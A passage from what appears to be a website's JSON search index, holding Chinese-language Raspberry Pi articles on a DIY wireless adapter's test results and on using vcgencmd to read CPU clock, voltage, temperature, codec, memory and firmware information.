WR703N\u548c\u98da\u738b\u7684Hub\u56fa\u5b9a\uff0c\u901a\u8fc7\u6811\u8393\u6d3e\u7684USB\u63a5\u53e3\u76f4\u63a5\u9a71\u52a8\u4e24\u5757U\u76d8\u3001\u4e00\u4e2a\u97f3\u54cd\u548c\u4e00\u4e2a\u8def\u7531\u5668\uff0c\u8c01\u8bf4\u6811\u8393\u6d3eU\u53e3\u7684\u9a71\u52a8\u80fd\u529b\u4f4e\u7684\uff1f \u7ec4\u5408\u4e00\u4e0b\uff0cDIY\u7684\u90a3\u6839\u9ed1\u8272USB\u7ebf\u5185\u90e8\u96c6\u6210\u4e86\u4e00\u9897 PL2303 \u82af\u7247\uff0c\u8fde\u63a5\u540e\u6811\u8393\u6d3e\u53ef\u4ee5\u901a\u8fc7\u4e32\u53e3\u8c03\u8bd5WR703N\u3002 \u4e0a\u7535\u5f00\u673a\uff0c\u5f53\u7136\uff0c\u4e0a\u7535\u4e4b\u524d\u7ecf\u5386\u4e86\u8270\u82e6\u5353\u7edd\u7684\u8c03\u8bd5\u3002","title":"\u786c\u4ef6\u8fde\u63a5"},{"location":"RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/#_4","text":"\u5b89\u88c5\u5b8c\u6210\u4e4b\u540e\u505a\u4e86\u4e9b\u7b80\u5355\u7684\u6d4b\u8bd5\uff0c\u8fd9\u6b3eDIY\u7684\u6811\u8393\u6d3e\u65e0\u7ebf\u7f51\u5361\u901f\u5ea6\u548c\u7a33\u5b9a\u6027\u5b8c\u5168\u7b26\u5408\u6211\u7684\u9884\u671f\uff01\u4e0b\u9762\u662f\u4e00\u4e9b\u6d4b\u8bd5\u7ed3\u679c\uff1a Samba\u8bfb\u53d6\u901f\u5ea6\u4e3a3.5~4.5 M/S. Samba\u5199\u5165\u901f\u5ea6\u4e3a3~3.3M/S. \u9891\u7e41\u901a\u8fc7Samba\u8bfb\u5199\u6811\u8393\u6d3e\u4e0a\u7684\u6587\u4ef6\uff0c\u5728\u8bfb\u53d68G\uff0c\u5199\u51655G\u7684\u6570\u636e\u4e4b\u540e\u6ca1\u6709\u51fa\u73b0\u6b7b\u673a\u5361\u6b7b\u7684\u60c5\u51b5\u3002","title":"\u6d4b\u8bd5"},{"location":"RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/#_5","text":"\u4ece\u4e0a\u9762\u7684\u6d4b\u8bd5\u7ed3\u679c\u548c\u6211\u51e0\u5929\u7684\u4f7f\u7528\u60c5\u51b5\u770b\u6765\uff0c\u8fd9\u6b3eDIY\u7684\u6811\u8393\u6d3e \u65e0\u7ebf\u7f51\u5361 \u62e5\u6709\u975e\u5e38\u53ef\u89c2\u7684\u901f\u5ea6\u548c\u7a33\u5b9a\u6027,\u53ef\u4ee5\u65e0\u89c6\u5e02\u9762\u4e0a\u5927\u90e8\u5206\u65e0\u7ebf\u7f51\u5361\u4e86\u3002 \u5728\u8c03\u8bd5\u8fd9\u6b3e\u7f51\u5361\u65f6\u82b1\u4e86\u4e0d\u5c11\u65f6\u95f4\uff0c\u65e0\u6570\u6b21\u60f3Knock my head against the wall.\u6211\u4f1a\u5c06\u8c03\u8bd5\u8fc7\u7a0b\u548c\u9047\u5230\u7684\u95ee\u9898\u8bb0\u5f55\u5728\u53e6\u4e00\u7bc7\u6587\u7ae0\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://www.shuyz.com/posts/diy-stable-wifi-adapter-for-raspberry-pi/","title":"\u603b\u7ed3"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/","text":"\u4f7f\u7528 vcgencmd \u6307\u4ee4\u67e5\u770b Raspberry Pi \u7684 CPU \u6eab\u5ea6\u3001\u904b\u884c\u901f\u5ea6\u8207\u96fb\u58d3\u7b49\u8cc7\u8a0a \u9019\u88cf\u4ecb\u7d39\u5982\u4f55\u4f7f\u7528 vcgencmd \u6307\u4ee4\u67e5\u770b Raspberry Pi \u7684 CPU \u6eab\u5ea6\u3001\u904b\u884c\u901f\u5ea6\u8207\u96fb\u58d3\u7b49\u8cc7\u8a0a\uff0c\u5373\u6642\u76e3\u63a7\u786c\u9ad4\u7684\u72c0\u614b\u3002 \u5728 Raspberry Pi \u4e2d\u6211\u5011\u53ef\u4ee5\u5229\u7528 vcgencmd \u6307\u4ee4\u4f86\u67e5\u770b\u5404\u7a2e\u7684\u786c\u9ad4\u8cc7\u8a0a\u8207\u72c0\u614b\uff0c\u4ee5\u4e0b\u662f\u5e38\u7528\u7684\u6307\u4ee4\u7bc4\u4f8b\u3002 (adsbygoogle = window.adsbygoogle || []).push({}); \u6642\u8108\u983b\u7387\uff08clock frequency\uff09 \u5982\u679c\u8981\u67e5\u8a62\u786c\u9ad4\u76ee\u524d\u7684\u6642\u8108\u983b\u7387\uff0c\u53ef\u4ee5\u4f7f\u7528 measure_clock \u53c3\u6578\uff1a vcgencmd measure_clock <clock> \u5176\u4e2d\u7684 <clock> \u662f\u6307\u5b9a\u8981\u67e5\u8a62\u7684\u786c\u9ad4\uff0c\u53ef\u7528\u7684\u9078\u9805\u6709 arm \u3001 core \u3001 h264 \u3001 isp \u3001 v3d \u3001 uart \u3001 pwm \u3001 emmc \u3001 pixel \u3001 vec \u3001 hdmi \u3001 dpi \u3002 \u5982\u679c\u8981\u67e5\u8a62 CPU \u7684\u6642\u8108\u983b\u7387\uff08\u4e5f\u5c31\u662f\u901f\u5ea6\uff09\uff0c\u53ef\u4ee5\u57f7\u884c vcgencmd measure_clock arm \u8f38\u51fa\u70ba frequency(45)=700000000 \u5982\u679c\u60f3\u67e5\u8a62\u6240\u6709\u7684\u786c\u9ad4\u6642\u8108\u983b\u7387\uff0c\u53ef\u4ee5\u4f7f\u7528\u7c21\u55ae\u7684 shell \u6307\u4ee4\u7a3f\uff1a for src in arm core h264 isp v3d uart pwm emmc pixel vec hdmi dpi ; do \\ echo -e \"$src:\\t$(vcgencmd measure_clock $src)\" ; \\ done \u8f38\u51fa\u70ba `arm: frequency(45)=700000000 core: frequency(1)=250000000 h264: frequency(28)=250000000 isp: frequency(42)=250000000 v3d: frequency(43)=250000000 uart: frequency(22)=3000000 pwm: frequency(25)=0 emmc: frequency(47)=250000000 pixel: frequency(29)=108000000 vec: frequency(10)=0 hdmi: frequency(9)=163682000 dpi: frequency(4)=0` \u96fb\u58d3\uff08voltage\uff09 \u5982\u679c\u8981\u67e5\u8a62\u786c\u9ad4\u76ee\u524d\u7684\u5de5\u4f5c\u96fb\u58d3\uff0c\u53ef\u4ee5\u4f7f\u7528 measure_volts \u53c3\u6578\uff1a vcgencmd measure_volts <id> \u5176\u4e2d <id> \u662f\u6307\u5b9a\u8981\u67e5\u8a62\u7684\u786c\u9ad4\uff0c\u53ef\u7528\u7684\u9078\u9805\u6709 core \u3001 sdram_c \u3001 sdram_i \u3001 sdram_p \u3002\u5982\u679c\u6c92\u6709\u6307\u5b9a <id> \uff0c\u5247\u9810\u8a2d\u70ba core \uff1a vcgencmd measure_volts \u8f38\u51fa\u70ba volt=1.200V \u67e5\u8a62\u6240\u6709\u5de5\u4f5c\u96fb\u58d3\u7684 shell \u6307\u4ee4\u7a3f\uff1a for id in core sdram_c sdram_i sdram_p ; do \\ echo -e \"$id:\\t$(vcgencmd measure_volts $id)\" ; \\ done \u8f38\u51fa\u70ba `core: volt=1.200V sdram_c: volt=1.200V sdram_i: volt=1.200V sdram_p: volt=1.225V` \u6eab\u5ea6\uff08temperature\uff09 \u5982\u679c\u8981\u67e5\u8a62 BCM2835 SoC \u76ee\u524d\u7684\u6eab\u5ea6\uff0c\u53ef\u4ee5\u4f7f\u7528 measure_temp \u53c3\u6578\uff1a vcgencmd measure_temp \u8f38\u51fa\u70ba temp=43.3\u2019C Codec \u82e5\u8981\u67e5\u8a62\u7279\u5b9a\u7684 codec \u6709\u6c92\u6709\u555f\u7528\uff0c\u53ef\u4ee5\u4f7f\u7528 codec_enabled \u53c3\u6578\uff1a vcgencmd codec_enabled <codec> \u5176\u4e2d <codec> \u662f\u6307\u5b9a\u8981\u67e5\u8a62\u7684 codec\uff0c\u53ef\u7528\u7684\u9078\u9805\u6709\uff1a H264 \u3001 MPG2 \u3001 WVC1 \u3001 MPG4 \u3001 MJPG \u3001 WMV9 \u3002 \u67e5\u8a62\u6240\u6709 codec \u7684\u6307\u4ee4\u7a3f\uff1a for codec in H264 MPG2 WVC1 MPG4 MJPG WMV9 ; do \\ echo -e \"$codec:\\t$(vcgencmd codec_enabled $codec)\" ; \\ done \u8f38\u51fa\u70ba\uff1a `H264: H264=enabled MPG2: MPG2=disabled WVC1: WVC1=disabled MPG4: MPG4=enabled MJPG: MJPG=enabled WMV9: WMV9=disabled` \u8a2d\u5b9a\u503c\uff08configurations\uff09 get_config \u53c3\u6578\u53ef\u4ee5\u5217\u51fa\u76ee\u524d\u7cfb\u7d71\u4e2d\u6240\u6709\u88ab\u8a2d\u5b9a\u7684\u53c3\u6578\u503c\uff1a vcgencmd get_config [config|int|str] \u6700\u5f8c\u4e00\u500b\u53c3\u6578\u53ef\u7528\u4f86\u6307\u5b9a\u8981\u67e5\u8a62\u7684\u8a2d\u5b9a\u503c\u540d\u7a31\u6216\u662f\u985e\u578b\uff0c\u4f8b\u5982\u67e5\u8a62 temp_limit \u7684\u6578\u503c\u53ef\u4ee5\u57f7\u884c\uff1a vcgencmd get_config temp_limit \u8f38\u51fa\u70ba temp_limit=85 \u67e5\u8a62\u6240\u6709\u6578\u503c\u8cc7\u6599\u7684\u8a2d\u5b9a\u503c\u53ef\u7528 vcgencmd get_config int \u8f38\u51fa\u70ba `hdmi_force_hotplug=1 disable_overscan=1 overscan_left=24 overscan_right=24 overscan_top=16 overscan_bottom=16 program_serial_random=1 config_hdmi_boost=4 emmc_pll_core=1 hdmi_force_cec_address=65535 framebuffer_ignore_alpha=1 framebuffer_swap=1 disable_splash=1 temp_limit=85 force_pwm_open=1 pause_burst_frames=1 second_boot=1 avoid_fix_ts=1` \u8a18\u61b6\u9ad4\u914d\u7f6e Raspberry Pi \u7684 CPU \u8207 GPU \u662f\u5171\u7528\u540c\u540c\u4e00\u500b\u8a18\u61b6\u9ad4\u7684\uff0c get_mem \u53c3\u6578\u53ef\u4ee5\u67e5\u8a62\u76ee\u524d\u8a18\u61b6\u9ad4\u7684\u914d\u7f6e\u72c0\u614b\u3002\u67e5\u8a62\u914d\u7f6e\u7d66 CPU \u7684\u8a18\u61b6\u9ad4\u5927\u5c0f\uff1a vcgencmd get_mem arm \u8f38\u51fa\u70ba arm=448M \u67e5\u8a62\u914d\u7f6e\u7d66 GPU \u7684\u8a18\u61b6\u9ad4\u5927\u5c0f\uff1a vcgencmd get_mem gpu \u8f38\u51fa\u70ba gpu=64M \u97cc\u9ad4\u7248\u672c\uff08firmware version\uff09 \u67e5\u8a62\u97cc\u9ad4\u7248\u672c\u53ef\u4ee5\u4f7f\u7528 vcgencmd version \u8f38\u51fa\u70ba `Dec 19 2014 18:44:06 Copyright (c) 2012 Broadcom version 5abd572e2ed1811283443387af09377b95501c50 (clean) (release)` OTP \u8a18\u61b6\u9ad4 \u82e5\u8981\u67e5\u8a62 SoC \u88e1\u9762 OTP\uff08one time programmable\uff09\u8a18\u61b6\u9ad4\u7684\u5167\u5bb9\uff0c\u53ef\u4ee5\u4f7f\u7528 otp_dump \uff1a vcgencmd otp_dump \u8f38\u51fa\u70ba `08:00000000 09:00000000 10:00000000 11:00000000 12:00000000 13:00000000 14:00000000 15:00000000 16:00280000 17:1020000a 18:1020000a 19:ffffffff 20:ffffffff 21:ffffffff 22:ffffffff 23:ffffffff 24:ffffffff 25:ffffffff 26:ffffffff 27:0000c2c2 28:4b45c38d 29:b4ba3c72 30:00000010 31:00000000 32:00000000 33:00000000 34:00000000 35:00000000 36:00000000 37:00000000 38:00000000 39:00000000 40:00000000 41:00000000 42:00000000 43:00000000 44:00000000 45:00000000 46:00000000 47:00000000 48:00000000 49:00000000 50:00000000 51:00000000 52:00000000 53:00000000 54:00000000 55:00000000 56:00000000 57:00000000 58:00000000 59:00000000 60:00000000 61:00000000 62:00000000 63:00000000 64:00000000` \u5176\u4e2d 28 \u8207 30 \u4ee3\u8868\u786c\u9ad4\u5e8f\u865f\uff08serial\uff09\u8207\u4fee\u8a02\u7248\uff08revision\uff09\u7684\u7248\u672c\u865f\u78bc\uff0c /proc/cpuinfo \u4e2d\u6240\u986f\u793a\u7684\u5e8f\u865f\u8207\u4fee\u8a02\u7248\u672c\u865f\u78bc\u5c31\u662f\u5f9e\u9019\u88e1\u53d6\u5f97\u7684\uff0c\u800c Model B/B+ \u7684\u7db2\u8def\u5361 MAC \u5361\u865f\u4e5f\u662f\u6839\u64da\u786c\u9ad4\u5e8f\u865f\u4f86\u7522\u751f\u7684\u3002 \u67e5\u770b vcgencmd \u6240\u6709\u53ef\u7528\u7684\u53c3\u6578 \u5982\u679c\u8981\u67e5\u770b vcgencmd \u6307\u4ee4\u6240\u6709\u53ef\u7528\u7684\u53c3\u6578\uff0c\u53ef\u4ee5\u57f7\u884c vcgencmd commands \u8f38\u51fa\u6703\u985e\u4f3c\u9019\u6a23\uff1a commands=\u201dvcos, ap_output_control, ap_output_post_processing, vchi_test_init, vchi_test_exit, pm_set_policy, pm_get_status, pm_show_stats, pm_start_logging, pm_stop_logging, version, commands, set_vll_dir, led_control, set_backlight, set_logging, get_lcd_info, set_bus_arbiter_mode, cache_flush, otp_dump, test_result, codec_enabled, get_camera, get_mem, measure_clock, measure_volts, scaling_kernel, measure_temp, get_config, hdmi_ntsc_freqs, hdmi_adjust_clock, hdmi_status_show, hvs_update_fields, pwm_speedup, force_audio, hdmi_stream_channels, hdmi_channel_map, display_power, read_ring_osc, memtest, get_rsts, render_bar, disk_notify, inuse_notify, sus_suspend, sus_status, sus_is_enabled, sus_stop_test_thread, egl_platform_switch, mem_validate, mem_oom, mem_reloc_stats, file, vctest_memmap, vctest_start, vctest_stop, vctest_set, vctest_get\u201d \u9019\u4e9b\u5c31\u662f\u6240\u6709\u53ef\u4ee5\u4f7f\u7528\u7684\u53c3\u6578\uff0c\u9019\u4e9b\u53c3\u6578\u6703\u56e0\u70ba\u97cc\u9ad4\u7248\u672c\u4e0d\u540c\u800c\u6709\u5dee\u7570\u3002 \u5982\u679c\u60a8\u5c0d\u65bc\u6a39\u8393\u6d3e\u7684\u61c9\u7528\u6709\u8208\u8da3\uff0c\u5efa\u8b70\u60a8\u53ef\u4ee5\u7e7c\u7e8c\u95b1\u8b80 \u7269\u806f\u7db2 \u7684\u76f8\u95dc\u6587\u7ae0\u3002 \u53c3\u8003\u8cc7\u6599\uff1a Embedded Linux Wiki \u3001 raspberrypi.org \u3001 maketecheasier \u3001 lokir\u2019s linux notes (adsbygoogle = window.adsbygoogle || []).push({}); \u539f\u6587\u94fe\u63a5\uff1a https://blog.gtwang.org/iot/raspberry-pi-vcgencmd-hardware-information/","title":"\u4f7f\u7528 vcgencmd \u6307\u4ee4\u67e5\u770b Raspberry Pi \u7684 CPU \u6eab\u5ea6\u3001\u904b\u884c\u901f\u5ea6\u8207\u96fb\u58d3\u7b49\u8cc7\u8a0a"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#vcgencmd-raspberry-pi-cpu","text":"\u9019\u88cf\u4ecb\u7d39\u5982\u4f55\u4f7f\u7528 vcgencmd \u6307\u4ee4\u67e5\u770b Raspberry Pi \u7684 CPU \u6eab\u5ea6\u3001\u904b\u884c\u901f\u5ea6\u8207\u96fb\u58d3\u7b49\u8cc7\u8a0a\uff0c\u5373\u6642\u76e3\u63a7\u786c\u9ad4\u7684\u72c0\u614b\u3002 \u5728 Raspberry Pi \u4e2d\u6211\u5011\u53ef\u4ee5\u5229\u7528 vcgencmd \u6307\u4ee4\u4f86\u67e5\u770b\u5404\u7a2e\u7684\u786c\u9ad4\u8cc7\u8a0a\u8207\u72c0\u614b\uff0c\u4ee5\u4e0b\u662f\u5e38\u7528\u7684\u6307\u4ee4\u7bc4\u4f8b\u3002 (adsbygoogle = window.adsbygoogle || []).push({});","title":"\u4f7f\u7528 vcgencmd \u6307\u4ee4\u67e5\u770b Raspberry Pi \u7684 CPU \u6eab\u5ea6\u3001\u904b\u884c\u901f\u5ea6\u8207\u96fb\u58d3\u7b49\u8cc7\u8a0a"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#clock-frequency","text":"\u5982\u679c\u8981\u67e5\u8a62\u786c\u9ad4\u76ee\u524d\u7684\u6642\u8108\u983b\u7387\uff0c\u53ef\u4ee5\u4f7f\u7528 measure_clock \u53c3\u6578\uff1a vcgencmd measure_clock <clock> \u5176\u4e2d\u7684 <clock> \u662f\u6307\u5b9a\u8981\u67e5\u8a62\u7684\u786c\u9ad4\uff0c\u53ef\u7528\u7684\u9078\u9805\u6709 arm \u3001 core \u3001 h264 \u3001 isp \u3001 v3d \u3001 uart \u3001 pwm \u3001 emmc \u3001 pixel \u3001 vec \u3001 hdmi \u3001 dpi \u3002 \u5982\u679c\u8981\u67e5\u8a62 CPU \u7684\u6642\u8108\u983b\u7387\uff08\u4e5f\u5c31\u662f\u901f\u5ea6\uff09\uff0c\u53ef\u4ee5\u57f7\u884c vcgencmd measure_clock arm \u8f38\u51fa\u70ba frequency(45)=700000000 \u5982\u679c\u60f3\u67e5\u8a62\u6240\u6709\u7684\u786c\u9ad4\u6642\u8108\u983b\u7387\uff0c\u53ef\u4ee5\u4f7f\u7528\u7c21\u55ae\u7684 shell \u6307\u4ee4\u7a3f\uff1a for src in arm core h264 isp v3d uart pwm emmc pixel vec hdmi dpi ; do \\ echo -e \"$src:\\t$(vcgencmd measure_clock $src)\" ; \\ done \u8f38\u51fa\u70ba `arm: frequency(45)=700000000 core: frequency(1)=250000000 h264: frequency(28)=250000000 isp: frequency(42)=250000000 v3d: frequency(43)=250000000 uart: frequency(22)=3000000 pwm: frequency(25)=0 emmc: frequency(47)=250000000 pixel: frequency(29)=108000000 vec: frequency(10)=0 hdmi: frequency(9)=163682000 dpi: frequency(4)=0`","title":"\u6642\u8108\u983b\u7387\uff08clock frequency\uff09"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#voltage","text":"\u5982\u679c\u8981\u67e5\u8a62\u786c\u9ad4\u76ee\u524d\u7684\u5de5\u4f5c\u96fb\u58d3\uff0c\u53ef\u4ee5\u4f7f\u7528 measure_volts \u53c3\u6578\uff1a vcgencmd measure_volts <id> \u5176\u4e2d <id> \u662f\u6307\u5b9a\u8981\u67e5\u8a62\u7684\u786c\u9ad4\uff0c\u53ef\u7528\u7684\u9078\u9805\u6709 core \u3001 sdram_c \u3001 sdram_i \u3001 sdram_p \u3002\u5982\u679c\u6c92\u6709\u6307\u5b9a <id> \uff0c\u5247\u9810\u8a2d\u70ba core \uff1a vcgencmd measure_volts \u8f38\u51fa\u70ba volt=1.200V \u67e5\u8a62\u6240\u6709\u5de5\u4f5c\u96fb\u58d3\u7684 shell \u6307\u4ee4\u7a3f\uff1a for id in core sdram_c sdram_i sdram_p ; do \\ echo -e \"$id:\\t$(vcgencmd measure_volts $id)\" ; \\ done \u8f38\u51fa\u70ba `core: volt=1.200V sdram_c: volt=1.200V sdram_i: volt=1.200V sdram_p: volt=1.225V`","title":"\u96fb\u58d3\uff08voltage\uff09"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#temperature","text":"\u5982\u679c\u8981\u67e5\u8a62 BCM2835 SoC \u76ee\u524d\u7684\u6eab\u5ea6\uff0c\u53ef\u4ee5\u4f7f\u7528 measure_temp \u53c3\u6578\uff1a vcgencmd measure_temp \u8f38\u51fa\u70ba temp=43.3\u2019C","title":"\u6eab\u5ea6\uff08temperature\uff09"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#codec","text":"\u82e5\u8981\u67e5\u8a62\u7279\u5b9a\u7684 codec \u6709\u6c92\u6709\u555f\u7528\uff0c\u53ef\u4ee5\u4f7f\u7528 codec_enabled \u53c3\u6578\uff1a vcgencmd codec_enabled <codec> \u5176\u4e2d <codec> \u662f\u6307\u5b9a\u8981\u67e5\u8a62\u7684 codec\uff0c\u53ef\u7528\u7684\u9078\u9805\u6709\uff1a H264 \u3001 MPG2 \u3001 WVC1 \u3001 MPG4 \u3001 MJPG \u3001 WMV9 \u3002 \u67e5\u8a62\u6240\u6709 codec \u7684\u6307\u4ee4\u7a3f\uff1a for codec in H264 MPG2 WVC1 MPG4 MJPG WMV9 ; do \\ echo -e \"$codec:\\t$(vcgencmd codec_enabled $codec)\" ; \\ done \u8f38\u51fa\u70ba\uff1a `H264: H264=enabled MPG2: MPG2=disabled WVC1: WVC1=disabled MPG4: MPG4=enabled MJPG: MJPG=enabled WMV9: WMV9=disabled`","title":"Codec"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#configurations","text":"get_config \u53c3\u6578\u53ef\u4ee5\u5217\u51fa\u76ee\u524d\u7cfb\u7d71\u4e2d\u6240\u6709\u88ab\u8a2d\u5b9a\u7684\u53c3\u6578\u503c\uff1a vcgencmd get_config [config|int|str] \u6700\u5f8c\u4e00\u500b\u53c3\u6578\u53ef\u7528\u4f86\u6307\u5b9a\u8981\u67e5\u8a62\u7684\u8a2d\u5b9a\u503c\u540d\u7a31\u6216\u662f\u985e\u578b\uff0c\u4f8b\u5982\u67e5\u8a62 temp_limit \u7684\u6578\u503c\u53ef\u4ee5\u57f7\u884c\uff1a vcgencmd get_config temp_limit \u8f38\u51fa\u70ba temp_limit=85 \u67e5\u8a62\u6240\u6709\u6578\u503c\u8cc7\u6599\u7684\u8a2d\u5b9a\u503c\u53ef\u7528 vcgencmd get_config int \u8f38\u51fa\u70ba `hdmi_force_hotplug=1 disable_overscan=1 overscan_left=24 overscan_right=24 overscan_top=16 overscan_bottom=16 program_serial_random=1 config_hdmi_boost=4 emmc_pll_core=1 hdmi_force_cec_address=65535 framebuffer_ignore_alpha=1 framebuffer_swap=1 disable_splash=1 temp_limit=85 force_pwm_open=1 pause_burst_frames=1 second_boot=1 avoid_fix_ts=1`","title":"\u8a2d\u5b9a\u503c\uff08configurations\uff09"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#_1","text":"Raspberry Pi \u7684 CPU \u8207 GPU \u662f\u5171\u7528\u540c\u540c\u4e00\u500b\u8a18\u61b6\u9ad4\u7684\uff0c get_mem \u53c3\u6578\u53ef\u4ee5\u67e5\u8a62\u76ee\u524d\u8a18\u61b6\u9ad4\u7684\u914d\u7f6e\u72c0\u614b\u3002\u67e5\u8a62\u914d\u7f6e\u7d66 CPU \u7684\u8a18\u61b6\u9ad4\u5927\u5c0f\uff1a vcgencmd get_mem arm \u8f38\u51fa\u70ba arm=448M \u67e5\u8a62\u914d\u7f6e\u7d66 GPU \u7684\u8a18\u61b6\u9ad4\u5927\u5c0f\uff1a vcgencmd get_mem gpu \u8f38\u51fa\u70ba gpu=64M","title":"\u8a18\u61b6\u9ad4\u914d\u7f6e"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#firmware-version","text":"\u67e5\u8a62\u97cc\u9ad4\u7248\u672c\u53ef\u4ee5\u4f7f\u7528 vcgencmd version \u8f38\u51fa\u70ba `Dec 19 2014 18:44:06 Copyright (c) 2012 Broadcom version 5abd572e2ed1811283443387af09377b95501c50 (clean) (release)`","title":"\u97cc\u9ad4\u7248\u672c\uff08firmware version\uff09"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#otp","text":"\u82e5\u8981\u67e5\u8a62 SoC \u88e1\u9762 OTP\uff08one time programmable\uff09\u8a18\u61b6\u9ad4\u7684\u5167\u5bb9\uff0c\u53ef\u4ee5\u4f7f\u7528 otp_dump \uff1a vcgencmd otp_dump \u8f38\u51fa\u70ba `08:00000000 09:00000000 10:00000000 11:00000000 12:00000000 13:00000000 14:00000000 15:00000000 16:00280000 17:1020000a 18:1020000a 19:ffffffff 20:ffffffff 21:ffffffff 22:ffffffff 23:ffffffff 24:ffffffff 25:ffffffff 26:ffffffff 27:0000c2c2 28:4b45c38d 29:b4ba3c72 30:00000010 31:00000000 32:00000000 33:00000000 34:00000000 35:00000000 36:00000000 37:00000000 38:00000000 39:00000000 40:00000000 41:00000000 42:00000000 43:00000000 44:00000000 45:00000000 46:00000000 47:00000000 48:00000000 49:00000000 50:00000000 51:00000000 52:00000000 53:00000000 54:00000000 55:00000000 56:00000000 57:00000000 58:00000000 59:00000000 60:00000000 61:00000000 62:00000000 63:00000000 64:00000000` \u5176\u4e2d 28 \u8207 30 \u4ee3\u8868\u786c\u9ad4\u5e8f\u865f\uff08serial\uff09\u8207\u4fee\u8a02\u7248\uff08revision\uff09\u7684\u7248\u672c\u865f\u78bc\uff0c /proc/cpuinfo \u4e2d\u6240\u986f\u793a\u7684\u5e8f\u865f\u8207\u4fee\u8a02\u7248\u672c\u865f\u78bc\u5c31\u662f\u5f9e\u9019\u88e1\u53d6\u5f97\u7684\uff0c\u800c Model B/B+ \u7684\u7db2\u8def\u5361 MAC \u5361\u865f\u4e5f\u662f\u6839\u64da\u786c\u9ad4\u5e8f\u865f\u4f86\u7522\u751f\u7684\u3002","title":"OTP \u8a18\u61b6\u9ad4"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#vcgencmd","text":"\u5982\u679c\u8981\u67e5\u770b vcgencmd \u6307\u4ee4\u6240\u6709\u53ef\u7528\u7684\u53c3\u6578\uff0c\u53ef\u4ee5\u57f7\u884c 